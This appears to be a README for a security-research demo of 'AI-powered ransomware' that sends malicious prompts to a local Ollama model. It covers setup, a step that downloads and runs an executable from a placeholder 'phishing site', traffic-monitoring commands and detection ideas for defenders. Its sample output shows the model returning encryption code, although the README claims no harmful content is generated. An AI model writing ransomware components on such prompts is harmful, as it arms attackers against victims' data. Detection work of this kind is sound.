# PromptLock AI-Powered Ransomware Demo

## 🎯 **Complete Demo Setup with AI Integration**

This enhanced demo safely demonstrates **actual AI model communication** for security research purposes. It transmits malicious prompts to local AI systems for detection testing **without generating harmful content**.

> **🛡️ ETHICAL USE ONLY:** This demo is designed for security research and detection policy development. The prompts are transmitted with clear security research headers and prefixed with safety disclaimers to prevent actual harmful generation while still allowing detection systems to identify the malicious patterns.

## 🚀 **Demo Features:**

### **✅ Realistic AI Integration:**
- **HTTP requests** to local Ollama AI models
- **Real-time verification** of prompt transmission
- **Network traffic monitoring** capabilities
- **Detailed logging** of all AI interactions

### **✅ Enhanced Verification:**
- **Request/Response tracking** with timestamps
- **Payload size monitoring** for network analysis
- **Error handling** for offline AI models
- **Full HTTP request details** displayed

## 🛠️ **Setup Instructions:**

### **1. Install Ollama (Required for AI Demo):**
```bash
# Install Ollama
curl -fsSL https://ollama.ai/install.sh | sh

# Stop Ollama service if running automatically
brew services stop ollama

# Start Ollama manually (to see logs)
ollama serve

# Install a small, fast model (in separate terminal)
ollama pull llama3.2:1b
```

### **2. Download and Run Demo:**
```bash
# Download from phishing site
wget https://your-vercel-site.vercel.app/promptlock.exe

# Make executable
chmod +x promptlock.exe

# For Windows
promptlock.exe

# For macOS/Linux (requires Wine)
wine promptlock.exe
```

## 🔍 **Verification Methods:**

### **1. Monitor Network Traffic:**
```bash
# Method A: Monitor HTTP requests with tcpdump
sudo tcpdump -i lo0 port 11434

# Method B: Monitor active connections with netstat
netstat -an | grep 11434

# Method C: Watch connections in real-time
watch -n 1 "netstat -an | grep 11434"

# Terminal 2: Run executable
wine promptlock.exe
```

### **2. Monitor Ollama Logs:**
```bash
# Terminal 1: Start Ollama (logs are shown by default)
ollama serve

# Terminal 2: Run executable and watch logs
wine promptlock.exe
```

### **3. HTTP Proxy Interception:**
```bash
# Install and run mitmproxy
brew install mitmproxy
mitmproxy --listen-port 8080

# Configure executable to use proxy
# (requires code modification)
```

## 📊 **What You'll See:**

### **✅ With Ollama Running:**
- **Real HTTP requests** to `localhost:11434`
- **Malicious prompts transmitted** for detection testing
- **Network traffic** visible in monitoring tools
- **Ollama logs** showing prompt transmission attempts
- **Safe demonstration** - no harmful content generated

### **⚠️ Without Ollama:**
- **Connection errors** showing attempted communication
- **Fallback simulation** mode
- **Clear indication** that AI communication was attempted

## 🚨 **Demo Output Examples:**

### **Successful AI Communication:**
```
🚨 SENDING MALICIOUS PROMPT: ENCRYPTION
🎯 Target: http://localhost:11434/api/generate
📏 Prompt Length: 1328 characters
📤 Sending HTTP POST request...
📡 Response Status: 200 OK
✅ PROMPT SUCCESSFULLY TRANSMITTED TO AI MODEL
🔍 AI Response Preview: Here's the SPECK encryption code...
```

### **AI Model Offline:**
```
🔍 Checking AI model endpoint status...
❌ AI endpoint unreachable: connection refused
💡 Tip: Start Ollama with 'ollama serve' to see live requests in real-time
⚠️ AI model offline - simulating prompt injection...
```

### **Network Traffic Verification:**
```bash
# Before running executable:
$ netstat -an | grep 11434
tcp4  0  0  127.0.0.1.11434  *.*  LISTEN

# During executable run (you'll see connections):
$ netstat -an | grep 11434
tcp4  0  0  127.0.0.1.11434  *.*  LISTEN
tcp4  0  0  127.0.0.1.52847  127.0.0.1.11434  ESTABLISHED
tcp4  0  0  127.0.0.1.11434  127.0.0.1.52847  ESTABLISHED
```

## 🎭 **Detection Opportunities:**

### **Network Level:**
- **HTTP POST requests** to `localhost:11434`
- **Large JSON payloads** containing malicious prompts
- **AI model API traffic** patterns

### **Application Level:**
- **Ollama server logs** showing malicious requests
- **AI model responses** to suspicious prompts
- **Process monitoring** of AI interactions

### **Content Level:**
- **String scanning** of executable for embedded prompts
- **Behavioral analysis** of AI request patterns
- **Response analysis** for malicious outputs

## 🔧 **Technical Details:**

### **AI Integration:**
- **Ollama API**: `http://localhost:11434/api/generate`
- **Model**: `llama3.2:1b` (1B parameter lightweight model)
- **Protocol**: HTTP POST with JSON payloads
- **Timeout**: 30 seconds per request

### **Why Llama3.2:1B?**
- **Size**: Only ~1.3GB download (vs 4.7GB for full model)
- **Speed**: Fast inference on any hardware
- **Memory**: Low RAM usage (~2GB vs 8GB+)
- **Performance**: Still capable of responding to prompts
- **Demo-friendly**: Quick setup and fast responses

### **Verification Features:**
- **Request tracking**: URL, headers, payload size
- **Response analysis**: Status, timing, content length
- **Error handling**: Network errors, model errors
- **Detailed logging**: All interactions logged

## 💡 **Pro Tips:**

### **For Security Researchers:**
1. **Run Wireshark** while executing to capture traffic
2. **Monitor Ollama logs** for request details
3. **Use network monitoring** to verify real communication
4. **Test with different AI models** for various responses

### **For Detection Engineers:**
1. **Monitor port 11434** for AI API traffic
2. **Scan executables** for Ollama endpoints
3. **Analyze JSON payloads** for malicious prompts
4. **Create YARA rules** for AI communication patterns

## 🎯 **Perfect Demo Flow:**

1. **Start monitoring** (tcpdump, Wireshark, Ollama logs)
2. **Download executable** from phishing site
3. **Run executable** with Wine
4. **Watch real-time** AI prompt injection
5. **Analyze traffic** and responses
6. **Demonstrate detection** methods

This creates a **complete, verifiable demonstration** of AI-powered ransomware with actual prompt injection attacks! 🚀

## 🔧 **Troubleshooting:**

### **"Address already in use" error:**
```bash
# Stop Ollama service
brew services stop ollama

# Kill any remaining processes
sudo lsof -ti:11434 | xargs sudo kill -9

# Start manually
ollama serve
```

### **Check if Ollama is running:**
```bash
# Check port status
netstat -an | grep 11434

# Check processes
ps aux | grep ollama

# Check system services
launchctl list | grep ollama
``` 